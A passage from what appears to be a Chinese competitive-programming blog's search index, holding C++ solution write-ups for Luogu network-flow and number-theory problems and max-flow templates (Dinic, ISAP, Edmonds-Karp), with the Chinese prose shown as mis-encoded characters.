c[vis[i]][vis[cnt]] * dis[vis[i]]; dis[vis[cnt]] = dis[vis[i]] + 1; dfs(i, j + 1); tot -= c[vis[i]][vis[cnt]] * dis[vis[i]]; dis[vis[cnt]] = 0; tmp += c[vis[cnt]][G[vis[cnt]][1]]; cnt--; } } node = 1; } if(cnt == n) { if(tot &lt; ans) ans = tot; return; }}int main() { int u, v, w; scanf(&quot;%d %d&quot;, &amp;n, &amp;m); for (int i = 1; i &lt;= n; ++i) { for (int j = 1; j &lt;= n; ++j) { c[i][j] = inf; } } for (int i = 1; i &lt;= m; ++i) { scanf(&quot;%d %d %d&quot;, &amp;u, &amp;v, &amp;w); if(c[u][v] &lt; w) continue; if(c[u][v] == inf) { G[u][++num[u]] = v; G[v][++num[v]] = u; } c[u][v] = c[v][u] = w; } for (int i = 1; i &lt;= n; ++i) { p = i; sort(G[i] + 1, G[i] + 1 + num[i], cmp); tmp += c[i][G[i][1]]; } for (int i = 1; i &lt;= n; ++i) { tot = 0; cnt = 1; vis[1] = i; tmp -= c[i][G[i][1]]; dis[i] = 1; dfs(1, 1); dis[i] = 0; tmp += c[i][G[i][1]]; } printf(&quot;%d&quot;, ans); return 0;}/* 65ms 808kB */ $D2T3$ åˆ—é˜Ÿå¹³è¡¡æ ‘?? $Splay$?? $FHQ\\_Treap$?? ä¸ä¼šæ¨¡æ‹Ÿæ‹¿ä¸‹$50$åˆ†,ä»¥åå†è¯´,é€ƒ ä»£ç 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;bits/stdc++.h&gt;using namespace std;typedef long long LL;inline int read() { int x = 0, f = 1; char ch = getchar(); while (!isdigit(ch)) {if (ch == '-') f = -1; ch = getchar();} while (isdigit(ch)) {x = x * 10 + ch - 48; ch = getchar();} return x * f;}const int maxn = 300010;struct Node { int x, y;} a[maxn];int n, m, q, tot;LL last[maxn], h[maxn], pos[510][50010], ans;int main() { n = read(); m = read(); q = read(); for (int i = 1; i &lt;= q; ++i) { a[i].x = read(); a[i].y = read(); h[i] = a[i].x; } for (int i = 1; i &lt;= n; ++i) { last[i] = last[i - 1] + m; } sort(h + 1, h + q + 1); //æ’åº tot = unique(h + 1, h + q + 1) - h - 1; //å»é‡ LL t; for (int i = 1; i &lt;= tot; ++i) { //ç¼–å· t = (LL)(h[i] - 1) * m; for (int j = 1; j &lt;= m; ++j) { pos[i][j] = ++t; } } int where; //a[i].xåœ¨hæ•°ç»„ä¸­çš„ä½ç½® for (int i = 1; i &lt;= q; ++i) { //æ¨¡æ‹Ÿ for (int j = 1; j &lt;= tot; ++j) { if (h[j] == a[i].x) { where = j; break; } } if (a[i].y == m) { //åœ¨æœ€åä¸€åˆ— ans = last[h[where]]; } else { ans = pos[where][a[i].y]; } printf(&quot;%lld\\n&quot;, ans); if (a[i].y != m) { //å‘å·¦çœ‹é½ for (int j = a[i].y; j &lt; m - 1; ++j) { pos[where][j] = pos[where][j + 1]; } pos[where][m - 1] = last[h[where]]; } for (int j = h[where]; j &lt; n; ++j) { //å‘å‰çœ‹é½ last[j] = last[j + 1]; } last[n] = ans; } return 0;}/* 50Points 13662ms 67344kB */ å¦‚æœ‰ç–‘é—®,å¯ä»¥åœ¨ä¸‹æ–¹è¯„è®ºåŒºç•™è¨€","link":"/p/c5ac34f0.html"},{"title":"ã€Œç½‘ç»œæµ24é¢˜ã€é­”æœ¯çƒé—®é¢˜-é¢˜è§£","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P2765ã€é­”æœ¯çƒé—®é¢˜ é¢˜ç›®å¤§æ„è¾“å…¥æŸ±å­æ•°$n$æ»¡è¶³å¦‚ä¸‹è§„åˆ™ æ¯æ¬¡åªèƒ½åœ¨æŸæ ¹æŸ±å­çš„æœ€ä¸Šé¢æ”¾çƒã€‚ åœ¨åŒä¸€æ ¹æŸ±å­ä¸­ï¼Œä»»ä½•2ä¸ªç›¸é‚»çƒçš„ç¼–å·ä¹‹å’Œä¸ºå®Œå…¨å¹³æ–¹æ•°ã€‚è¾“å‡ºåœ¨ç¬¬$n$æ ¹æŸ±å­ä¸Šæœ€å¤šèƒ½æ”¾å¤šå°‘çƒå’Œæ”¾ç½®æ–¹æ¡ˆ é¢˜è§£å¹¶ä¸æ‰“ç®—ä½¿ç”¨ç½‘ç»œæµ,ç”¨è´ªå¿ƒå³å¯è´ªå¿ƒç­–ç•¥: å¦‚æœå¯ä»¥çš„è¯å°½å¯èƒ½æ”¾åœ¨å·²æœ‰çš„æŸ±å­ä¸Š ä»£ç 12345678910111213141516171819202122232425262728293031323334#include &lt;bits/stdc++.h&gt;using namespace std;vector&lt;int&gt; a[110];bool can[4010];int n, ans = 1, cnt;int main() { scanf(&quot;%d&quot;, &amp;n); for (int i = 1; i * i &lt;= 4000; ++i) { can[i * i] = true; } while (true) { for (int i = 1; i &lt;= cnt; ++i) { if (can[ ans + a[ i ][ a[i].size() - 1 ] ]) { a[i].push_back(ans++); i = 0; continue; } } if (cnt &lt; n) { cnt++; a[cnt].push_back(ans++); } else break; } printf(&quot;%d\\n&quot;, ans - 1); for (int i = 1; i &lt;= n; ++i) { for (int j = 0; j &lt; a[i].size(); ++j) { printf(&quot;%d &quot;, a[i][j]); } printf(&quot;\\n&quot;); } return 0;}","link":"/p/f2e850c0.html"},{"title":"ã€Œç½‘ç»œæµ24é¢˜ã€æœ€å°è·¯å¾„è¦†ç›–é—®é¢˜-é¢˜è§£","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P2764ã€æœ€å°è·¯å¾„è¦†ç›–é—®é¢˜ é¢˜ç›®å¤§æ„é¢˜ç›®æè¿°ç»™çš„å¾ˆç›´ç™½,è¾“å…¥ç‚¹æ•°è¾¹æ•°å’Œæœ‰å‘è¾¹,è¾“å‡ºæœ€å°‘è·¯å¾„æ•°å’Œè·¯å¾„ é¢˜è§£æ­£å¸¸å»ºå›¾å¦‚æœä¸€æ¡è·¯å¾„çš„ç»ˆç‚¹å’Œå¦ä¸€æ¡è·¯å¾„çš„èµ·ç‚¹æœ‰è¿è¾¹ï¼Œé‚£ä¹ˆè¿™ä¸¤æ¡è·¯å¾„æ˜¯å¯ä»¥åˆå¹¶çš„ã€‚ä½†æ˜¯ä¸€ä¸ªç»ˆç‚¹æˆ–èµ·ç‚¹åªèƒ½ä½¿ç”¨ä¸€æ¬¡ã€‚æ¯”å¦‚ä¸‰æ¡è·¯å¾„$1 \\rightarrow 3, 2 \\rightarrow 3, 3 \\rightarrow 4$ï¼Œä½ åªèƒ½åˆå¹¶ä¸¤æ¡ã€‚é‚£ä¹ˆè¿™é“é¢˜å°±è½¬åŒ–ä¸ºäº†ï¼šæœ€å¤§åŒ–ä¸€ä¸ªè¾¹é›†ï¼Œä½¿å¾—è¾¹é›†ä¸­æ¯ä¸ªèµ·ç‚¹å’Œç»ˆç‚¹éƒ½åªä½¿ç”¨è¿‡ä¸€æ¬¡ã€‚å³__æœ€å¤§ç‹¬ç«‹è¾¹é›†__ã€‚æŠŠæ¯ä¸ªç‚¹æ‹†æˆå…¥ç‚¹$x$å’Œå‡ºç‚¹$xâ€™$,ä»æºç‚¹åˆ°$xâ€™$è¿ä¸€æ¡å®¹é‡ä¸º$1$çš„è¾¹ï¼Œä»$x$åˆ°æ±‡ç‚¹è¿ä¸€æ¡å®¹é‡ä¸º$1$çš„è¾¹ã€‚è¾¹æƒç”¨æ¥é™åˆ¶æ¯ä¸ªèµ·ç‚¹æˆ–ç»ˆç‚¹çš„ä½¿ç”¨æ¬¡æ•°ã€‚å¯¹äºæ¯æ¡è¾¹$x \\rightarrow y$ï¼Œè¿æ¥$xâ€™ \\rightarrow y$ç­”æ¡ˆæ˜¯$n-æœ€å¤§æµ$ ä»£ç 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#include &lt;bits/stdc++.h&gt;using namespace std;const int maxn = 1010;const int inf = 0x3f3f3f3f;bool vis[maxn], vst[maxn];int n, m, s, t;int d[maxn], cur[maxn], to[maxn];struct Edge { int from, to, cap, flow; Edge(int u, int v, int c, int f) : from(u), to(v), cap(c), flow(f) {}};vector&lt;Edge&gt; edges;vector&lt;int&gt; G[maxn];void add(int u, int v, int c) { edges.push_back(Edge(u, v, c, 0)); edges.push_back(Edge(v, u, 0, 0)); int mm = edges.size(); G[u].push_back(mm - 2); G[v].push_back(mm - 1);}bool bfs() { memset(vis, 0, sizeof(vis)); queue&lt;int&gt; Q; Q.push(s); d[s] = 0; vis[s] = true; while (!Q.empty()) { int x = Q.front(); Q.pop(); for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (!vis[e.to] &amp;&amp; e.cap &gt; e.flow) { vis[e.to] = true; d[e.to] = d[x] + 1; Q.push(e.to); } } } return vis[t];}int dfs(int x, int a) { if (x == t || a == 0) return a; int flow = 0, f; for (int&amp; i = cur[x]; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (d[x] + 1 == d[e.to] &amp;&amp; (f = dfs(e.to, min(a, e.cap - e.flow))) &gt; 0) { to[x] = e.to; e.flow += f; edges[G[x][i] ^ 1].flow -= f; flow += f; a -= f; if (a == 0) break; } } return flow;}int maxflow(int s, int t) { int flow = 0; while (bfs()) { memset(cur, 0, sizeof(cur)); flow += dfs(s, inf); } return flow;}int main() { scanf(&quot;%d %d&quot;, &amp;n, &amp;m); s = 0; t = 2 * n + 1; for (int i = 1; i &lt;= m; ++i) { int u, v; scanf(&quot;%d %d&quot;, &amp;u, &amp;v); add(u, v + n, 1); } for (int i = 1; i &lt;= n; ++i) add(s, i, 1); for (int i = 1; i &lt;= n; ++i) add(i + n, t, 1); int ans = maxflow(s, t); for (int i = 1; i &lt;= n; ++i) { if (!vst[i]) { int x = i; vst[x] = true; printf(&quot;%d &quot;, x); while (to[x] &amp;&amp; to[x] != t) { x = to[x] - n; printf(&quot;%d &quot;, x); vst[x] = true; } printf(&quot;\\n&quot;); } } printf(&quot;%d\\n&quot;, n - ans); return 0;}","link":"/p/7973b062.html"},{"title":"ã€Œç½‘ç»œæµ24é¢˜ã€è¯•é¢˜åº“é—®é¢˜-é¢˜è§£","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P2763ã€è¯•é¢˜åº“é—®é¢˜ é¢˜ç›®å¤§æ„å‡è®¾ä¸€ä¸ªè¯•é¢˜åº“ä¸­æœ‰$n$é“è¯•é¢˜,æ¯é“è¯•é¢˜éƒ½æ ‡æ˜äº†æ‰€å±ç±»åˆ«,åŒä¸€é“é¢˜å¯èƒ½æœ‰å¤šä¸ªç±»åˆ«å±æ€§,ç°è¦ä»é¢˜åº“ä¸­æŠ½å–$m$é“é¢˜ç»„æˆè¯•å·,å¹¶è¦æ±‚è¯•å·åŒ…å«æŒ‡å®šç±»å‹çš„è¯•é¢˜,è¾“å‡ºå‡ºé¢˜æ–¹æ¡ˆ é¢˜è§£å»ºå›¾: ç±»å‹ä¸æ±‡ç‚¹è¿å®¹é‡ä¸ºé¢˜ç›®æ•°çš„è¾¹;é¢˜ç›®ä¸æºç‚¹è¿å®¹é‡ä¸º$1$çš„è¾¹;é¢˜ç›®ä¸æ‰€å±ç±»å‹è¿å®¹é‡ä¸º$1$çš„è¾¹ç»“æœ: å¦‚æœæ»¡æµåˆ™å¯ä»¥å®ç°(æ²¿æ»¡æµè¾“å‡ºå³å¯),æ²¡æœ‰æ»¡æµè¾“å‡ºNo Solution! ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#include &lt;bits/stdc++.h&gt;using namespace std;const int maxn = 2020;const int inf = 0x3f3f3f3f;bool vis[maxn];int k, n, s, t, sum, d[maxn], cur[maxn];int ans[maxn], ansi;struct Edge { int from, to, cap, flow; Edge(int u, int v, int c, int f): from(u), to(v), cap(c), flow(f){}};vector&lt;Edge&gt; edges;vector&lt;int&gt; G[maxn];void add(int u, int v, int c) { edges.push_back(Edge(u, v, c, 0)); edges.push_back(Edge(v, u, 0, 0)); int mm = edges.size(); G[u].push_back(mm - 2); G[v].push_back(mm - 1);}bool bfs() { memset(vis, 0, sizeof(vis)); queue&lt;int&gt; Q; Q.push(s); d[s] = 0; vis[s] = true; while (!Q.empty()) { int x = Q.front(); Q.pop(); for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (!vis[e.to] &amp;&amp; e.cap &gt; e.flow) { vis[e.to] = 1; d[e.to] = d[x] + 1; Q.push(e.to); } } } return vis[t];}int dfs(int x, int a) { if (x == t || a == 0) return a; int flow = 0, f; for (int&amp; i = cur[x]; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (d[x] + 1 == d[e.to] &amp;&amp; (f = dfs(e.to, min(a, e.cap - e.flow))) &gt; 0) { e.flow += f; edges[G[x][i] ^ 1].flow -= f; flow += f; a -= f; if (a == 0) break; } } return flow;}int MaxFlow(int s, int t) { int flow = 0; while (bfs()) { memset(cur, 0, sizeof(cur)); flow += dfs(s, inf); } return flow;}int main() { scanf(&quot;%d %d&quot;, &amp;k, &amp;n); s = 0; t = n + k + 1; for (int i = 1; i &lt;= k; ++i) { int type; scanf(&quot;%d&quot;, &amp;type); sum += type; add(n + i, t, type); } for (int i = 1; i &lt;= n; ++i) { add(s, i, 1); int p, type; scanf(&quot;%d&quot;, &amp;p); for (int j = 1; j &lt;= p; ++j) { scanf(&quot;%d&quot;, &amp;type); add(i, type + n, 1); } } int maxflow = MaxFlow(s, t); if (maxflow == sum) { for (int i = n + 1; i &lt;= n + k; ++i) { printf(&quot;%d: &quot;, i - n); for (int j = 0; j &lt; G[i].size(); ++j) { Edge&amp; e = edges[G[i][j]]; if (e.cap == 0 &amp;&amp; e.flow != 0) { printf(&quot;%d &quot;, e.to); } } printf(&quot;\\n&quot;); } } else { printf(&quot;No Solution!\\n&quot;); } return 0;}","link":"/p/5a8ce31f.html"},{"title":"ã€ŒLuogu P5020 P1621 P4942ã€å°ç»ƒä¹ -é¢˜è§£","text":"$\\mathcal{ã€ŒP5020ã€}$ è´§å¸ç³»ç»Ÿè¡¨é¢ä¸Šæ˜¯æ•°è®ºï¼Œå…¶å®å°±æ˜¯ä¸ª__åŠ¨æ€è§„åˆ’__ é¦–å…ˆè®¾$A = (n, a) \\ \\ B = (m, b)$å¯ä»¥è¯æ˜$B \\subseteq A$$proof:$ æˆ‘ä»¬è®¾$x\\in A$ä¸”$x$ä¸èƒ½è¢«$A$é›†åˆå†…é™¤å®ƒä»¥å¤–çš„å…ƒç´ ç»„æˆã€‚ ç„¶åæˆ‘ä»¬å‡è®¾$x \\notin B$ï¼Œé‚£ä¹ˆå°±è¯´æ˜$B$é›†åˆä¸­å¿…ç„¶å­˜åœ¨ä¸€äº›å…ƒç´ èƒ½å¤Ÿç»„æˆ$x$ã€‚ é‚£ä¹ˆè¿™äº›å…ƒç´ è‡³å°‘å­˜åœ¨ä¸€ä¸ªä¸åœ¨é›†åˆ$A$å†…å¹¶ä¸”ä¸èƒ½è¢«é›†åˆ$A$é‡Œçš„å…ƒç´ ç»„æˆçš„æ•°ï¼ˆå› ä¸ºå¦‚æœä¸å­˜åœ¨çš„è¯é›†åˆ$A$å†…çš„å…ƒç´ å°±å¯ä»¥ç»„æˆ$x$äº†ï¼‰ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸é›†åˆ$B$çš„å®šä¹‰äº§ç”Ÿäº†çŸ›ç›¾ã€‚ ç»¼ä¸Šæ‰€è¿°ï¼Œ$A$é›†åˆå†…ä¸èƒ½è¢«å…¶å®ƒæ•°ç»„æˆçš„æ•°å¿…ç„¶å­˜åœ¨äº$B$é›†åˆå†…$Q.E.D$ ç„¶ååŠ¨æ€è§„åˆ’dp[i]è¡¨ç¤º$i$é¢å€¼æœ€å¤šèƒ½è¢«å‡ å¼ é’±è¡¨ç¤ºåˆ™è‹¥å…¶ä¸èƒ½è¢«è¡¨ç¤ºdp[i] = -infèƒ½è¡¨ç¤ºä¸”åªæœ‰å®ƒè‡ªå·±åˆ™dp[i] = 1åˆå§‹åŒ–dp[] = -inf; dp[0] = 0çŠ¶æ€è½¬ç§»æ–¹ç¨‹ä¸ºdp[j] = max(dp[j], dp[j - a[i]] + 1) 123456789101112131415161718192021222324252627282930#include &lt;bits/stdc++.h&gt;using namespace std;int n, T, ans, a[1010], dp[30010];int main() { scanf(&quot;%d&quot;, &amp;T); while (T--) { memset(dp, -0x3f, sizeof(dp)); memset(a, 0, sizeof(a)); ans = 0; dp[0] = 0; scanf(&quot;%d&quot;, &amp;n); for (int i = 1; i &lt;= n; ++i) { scanf(&quot;%d&quot;, &amp;a[i]); } for (int i = 1; i &lt;= n; ++i) { for (int j = a[i]; j &lt;= 25010; ++j) { dp[j] = max(dp[j], dp[j - a[i]] + 1); } } for (int i = 1; i &lt;= n; ++i) { if (dp[a[i]] == 1) { ans++; } } printf(&quot;%d\\n&quot;, ans); } return 0;}/* 862ms 944kB */ $\\mathcal{ã€ŒP1621ã€}$ é›†åˆä½¿ç”¨__å¹¶æŸ¥é›†å’ŒåŸƒæ°ç­›æ³•__(åŸƒæ‹‰æ‰˜æ–¯ç‰¹å°¼ç­›æ³•)å³å¯å…·ä½“æ“ä½œæ˜¯è¾¹ç­›è¾¹åˆå¹¶é›†åˆ 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;bits/stdc++.h&gt;using namespace std;const int maxn = 100010;int ufs[maxn], a, b, p, ans;bool isprime[maxn];int find(int x) { return ufs[x] == x ? x : ufs[x] = find(ufs[x]);}int main() { scanf(&quot;%d %d %d&quot;, &amp;a, &amp;b, &amp;p); ans = b - a + 1; //åˆå§‹ä¸ªæ•°ä¸ºåŒºé—´å†…æ•°çš„ä¸ªæ•° for (int i = a; i &lt;= b; ++i) { //åˆå§‹åŒ– ufs[i] = i; } for (int i = 2; i &lt;= b; ++i) { //åŸƒæ°ç­› if (!isprime[i]) { if (i &gt;= p) { //å¤§äºpæ‰åˆå¹¶ for (int j = i * 2; j &lt;= b; j += i) { isprime[j] = true; if (j - i &gt;= a &amp;&amp; find(j) != find(j - i)) { //åˆå¹¶ ufs[find(j)] = find(j - i); --ans; } } } else { //ä¸å¤§äºpä½†è¦æ ‡è®° for (int j = i * 2; j &lt;= b; j += i) { isprime[j] = true; } } } } printf(&quot;%d\\n&quot;, ans); return 0;}/* 38ms 1312kB */ $\\mathcal{ã€ŒP4942ã€}$ å°å‡¯çš„æ•°å­—ç±»ä¼¼äº$NOIp2017\\ D1T1$ å°å‡¯çš„ç–‘æƒ‘,æ¨æŸ¿å­å³å¯ é¦–å…ˆ$l(l+1)(l+2)â€¦(r-1)r$å¯ä»¥è¡¨ç¤ºä¸º$l\\times 10^? + (l + 1)\\times 10^? + â€¦ + r\\times 10^?$åŒæ—¶æˆ‘ä»¬çŸ¥é“$10$çš„è‹¥å¹²æ¬¡æ–¹é™¤ä»¥$9$çš„ä½™æ•°__æ’ä¸º__$1$æ‰€ä»¥$l(l+1)(l+2)â€¦(r-1)r$é™¤ä»¥$9$çš„ä½™æ•°å°±ç­‰äº$l + (l + 1) + â€¦ + (r - 1) + r$çš„ä½™æ•°å¹¶ä¸”$l,l+1,â€¦,r$ä¸ºç­‰å·®æ•°åˆ—,å…¬å·®ä¸º$1$è¿ç”¨ç­‰å·®æ•°åˆ—æ±‚å’Œå…¬å¼å³å¯æ±‚è§£ $a_1 = l\\ d = 1$$n = r - l + 1$$S_n = n\\times a_1 + n\\times (n - 1)\\times \\frac{d}{2}$æ‰€ä»¥$$\\boxed{Ans = n\\times l + n\\times (n - 1) \\div 2}$$ å¦å¤–è¦è¾¹ç®—è¾¹å–æ¨¡,é™¤ä»¥$2$è¦å˜æˆä¹˜æ¨¡$9$ä¸‹çš„é€†å…ƒ$5$æ‰€ä»¥å…¬å¼å¦‚ä¸‹ans = (n * (l % 9) % 9 + n * (n - 1) % 9 * 5 % 9) % 9; 1234567891011121314151617#include &lt;bits/stdc++.h&gt;using namespace std;int T;long long l, r, n, ans;int main() { scanf(&quot;%d&quot;, &amp;T); while (T--) { scanf(&quot;%lld %lld&quot;, &amp;l, &amp;r); n = (r - l + 1) % 9; ans = (n * (l % 9) % 9 + n * (n - 1) % 9 * 5 % 9) % 9; printf(&quot;%lld\\n&quot;, ans); } return 0;}/* 32ms 888kB */ å¦‚æœ‰ç–‘é—®,å¯ä»¥åœ¨ä¸‹æ–¹è¯„è®ºåŒºç•™è¨€","link":"/p/eb0c7a6c.html"},{"title":"ã€Œç½‘ç»œæµ24é¢˜ã€é£è¡Œå‘˜é…å¯¹æ–¹æ¡ˆé—®é¢˜-é¢˜è§£","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P2756ã€é£è¡Œå‘˜é…å¯¹æ–¹æ¡ˆæ•°é—®é¢˜ é¢˜ç›®å¤§æ„è¾“å…¥ä¸¤æ–¹é£è¡Œå‘˜ä¸ªæ•°$m,n$,å†ç»™å®šä¸¤æ–¹é£è¡Œå‘˜å¯ä»¥é…åˆçš„äººç¼–å·$i,j$(ä»¥$-1,-1$ç»“æŸ)è¾“å‡ºæœ€å¤šé…å¯¹æ•°å’Œé…å¯¹æ–¹æ¡ˆ é¢˜è§£ä¸»è¦åœ¨å»ºå›¾çš‡å®¶ç©ºå†›ä¸æºç‚¹$s$è¿å®¹é‡$1$çš„è¾¹,å¤–ç±ä¸æ±‡ç‚¹$t$è¿å®¹é‡$1$çš„è¾¹,å¯é…åˆçš„ä¸¤ç‚¹é—´è¿å®¹é‡ä¸º$1$çš„è¾¹è¾“å‡ºæœ€å¤§æµå³å¯(è¦æ‰¾é…å¯¹æ–¹æ¡ˆ) ä¹Ÿå¯ä»¥ä½¿ç”¨åŒˆç‰™åˆ©ç®—æ³•(æœ¬æ–‡ä¸ç»™å‡º) ä»£ç 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#include &lt;bits/stdc++.h&gt;using namespace std;const int maxn = 120;const int inf = 0x3f3f3f3f;int n, m, s, t;int d[maxn], cur[maxn];struct Edge { int from, to, cap, flow; Edge(int u, int v, int c, int f): from(u), to(v), cap(c), flow(f){};};vector&lt;Edge&gt; edges;vector&lt;int&gt; G[maxn];void add(int u, int v, int c) { edges.push_back(Edge(u, v, c, 0)); edges.push_back(Edge(v, u, 0, 0)); int mm = edges.size(); G[u].push_back(mm - 2); G[v].push_back(mm - 1);}bool vis[maxn];bool bfs() { memset(vis, 0, sizeof(vis)); queue&lt;int&gt; Q; Q.push(s); d[s] = 0; vis[s] = 1; while (!Q.empty()) { int x = Q.front(); Q.pop(); for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (!vis[e.to] &amp;&amp; e.cap &gt; e.flow) { vis[e.to] = 1; d[e.to] = d[x] + 1; Q.push(e.to); } } } return vis[t];}int dfs(int x, int a) { if (x == t || a == 0) return a; int flow = 0, f; for (int&amp; i = cur[x]; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (d[x] + 1 == d[e.to] &amp;&amp; (f = dfs(e.to, min(a, e.cap - e.flow))) &gt; 0) { e.flow += f; edges[G[x][i] ^ 1].flow -= f; flow += f; a -= f; if (a == 0) break; } } return flow;}int MaxFlow(int s, int t) { int flow = 0; while (bfs()) { memset(cur, 0, sizeof(cur)); flow += dfs(s, inf); } return flow;}int main() { scanf(&quot;%d %d&quot;, &amp;m, &amp;n); s = 0; t = n + 1; int u, v; while (scanf(&quot;%d %d&quot;, &amp;u, &amp;v) == 2 &amp;&amp; u != -1 &amp;&amp; v != -1) { add(u, v, 1); } for (int i = 1; i &lt;= m; ++i) { add(s, i, 1); } for (int i = m + 1; i &lt;= n; ++i) { add(i, t, 1); } int flow = MaxFlow(s, t); if (flow == 0) { printf(&quot;No Solution!\\n&quot;); return 0; } printf(&quot;%d\\n&quot;, flow); for (int i = 0; i &lt; edges.size(); i = i + 2) { if (edges[i].from != s &amp;&amp; edges[i].to != t) { if (edges[i].flow != 0) { printf(&quot;%d %d\\n&quot;, edges[i].from, edges[i].to); } } } return 0;}","link":"/p/154ff24f.html"},{"title":"Cppç®—æ³•-ç½‘ç»œæµç›¸å…³","text":"ç½‘ç»œæµç®—æ³•ç›¸å…³æ¨¡æ¿,è®²è§£__ä»¥åå†è¯´å§__,å’•å’•å’• æ³¨:æœ¬æ–‡ä½¿ç”¨vectorå»ºå›¾ ç½‘ç»œæœ€å¤§æµEdmonds-Karpç®—æ³•1234567891011121314151617181920212223242526272829303132333435363738394041424344454647int n, m, s, t, ans;struct Edge { int from, to, cap, flow; Edge(int u, int v, int c, int f): from(u), to(v), cap(c), flow(f){}};vector&lt;Edge&gt; edges;vector&lt;int&gt; G[maxn];int a[maxn], p[maxn];void add(int from, int to, int cap) { edges.push_back(Edge(from, to, cap, 0)); edges.push_back(Edge(to, from, 0, 0)); int mm = edges.size(); G[from].push_back(mm - 2); G[to].push_back(mm - 1);}void EdmondsKarp() { ans = 0; for (;;) { memset(a, 0, sizeof(a)); queue&lt;int&gt; Q; Q.push(s); a[s] = 0x3f3f3f3f; while (!Q.empty()) { int x = Q.front(); Q.pop(); for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (!a[e.to] &amp;&amp; e.cap &gt; e.flow) { p[e.to] = G[x][i]; a[e.to] = min(a[x], e.cap - e.flow); Q.push(e.to); } } if (a[t]) break; } if (!a[t]) break; for (int u = t; u != s; u = edges[p[u]].from) { edges[p[u]].flow += a[t]; edges[p[u] ^ 1].flow -= a[t]; } ans += a[t]; } return;} Dinicç®—æ³•(å¸¸ç”¨)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162const int maxn = 10010;int n, m, s, t, d[maxn], cur[maxn];struct Edge { int from, to, cap, flow;};vector&lt;Edge&gt; edges;vector&lt;int&gt; G[maxn];void add(int from, int to, int cap) { edges.push_back((Edge) {from, to, cap, 0}); edges.push_back((Edge) {to, from, 0, 0}); int mm = edges.size(); G[from].push_back(mm - 2); G[to].push_back(mm - 1);}bool vis[maxn];bool BFS() { memset(vis, 0, sizeof(vis)); queue&lt;int&gt; Q; Q.push(s); d[s] = 0; vis[s] = 1; while (!Q.empty()) { int x = Q.front(); Q.pop(); for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (!vis[e.to] &amp;&amp; e.cap &gt; e.flow) { vis[e.to] = 1; d[e.to] = d[x] + 1; Q.push(e.to); } } } return vis[t];}int DFS(int x, int a) { if (x == t || a == 0) return a; int flow = 0, f; for (int&amp; i = cur[x]; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (d[x] + 1 == d[e.to] &amp;&amp; (f = DFS(e.to, min(a, e.cap - e.flow))) &gt; 0) { e.flow += f; edges[G[x][i] ^ 1].flow -= f; flow += f; a -= f; if (a == 0) break; } } return flow;}int MaxFlow(int s, int t) { int flow = 0; while (BFS()) { memset(cur, 0, sizeof(cur)); flow += DFS(s, 0x3f3f3f3f); } return flow;} ISAPç®—æ³•1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192const int maxn = 10010;const int inf = 0x3f3f3f3f;int n, m, s, t;int d[maxn], p[maxn], num[maxn], cur[maxn];bool vis[maxn];struct Edge { int from, to, cap, flow; Edge(int u, int v, int c, int f): from(u), to(v), cap(c), flow(f){}};vector&lt;Edge&gt; edges;vector&lt;int&gt; G[maxn];void add(int from, int to, int cap) { edges.push_back(Edge(from, to, cap, 0)); edges.push_back(Edge(to, from, 0, 0)); int mm = edges.size(); G[from].push_back(mm - 2); G[to].push_back(mm - 1);}void bfs() { memset(vis, 0, sizeof(vis)); queue&lt;int&gt; Q; Q.push(t); d[t] = 0; vis[t] = 1; while (!Q.empty()) { int x = Q.front(); Q.pop(); for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (!vis[e.from] &amp;&amp; e.cap &gt; e.flow) { vis[e.from] = 1; d[e.from] = d[x] + 1; Q.push(e.from); } } }}int Augment() { int x = t, a = inf; while (x != s) { Edge&amp; e = edges[p[x]]; a = min(a, e.cap - e.flow); x = edges[p[x]].from; } x = t; while (x != s) { edges[p[x]].flow += a; edges[p[x] ^ 1].flow -= a; x = edges[p[x]].from; } return a;}int ISAP(int s, int t) { int flow = 0; bfs(); memset(num, 0, sizeof(num)); for (int i = 0; i &lt; n; ++i) num[d[i]]++; int x = s; memset(cur, 0, sizeof(cur)); while (d[s] &lt; n) { if (x == t) { flow += Augment(); x = s; } int ok = 0; for (int i = cur[x]; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (e.cap &gt; e.flow &amp;&amp; d[x] == d[e.to] + 1) { ok = 1; p[e.to] = G[x][i]; cur[x] = i; x = e.to; break; } } if (!ok) { int mm = n - 1; for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (e.cap &gt; e.flow) mm = min(mm, d[e.to]); } if (--num[d[x]] == 0) break; num[d[x] = mm + 1]++; cur[x] = 0; if (x != s) x = edges[p[x]].from; } } return flow;} æœ€å°è´¹ç”¨æœ€å¤§æµBellman-Fordç®—æ³•12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758const int maxn = 10010;const int inf = 0x3f3f3f3f;int n, m, s, t, ansflow;int vis[maxn], d[maxn], p[maxn], a[maxn];long long anscost;struct Edge { int from, to, cap, flow, cost; Edge(int u, 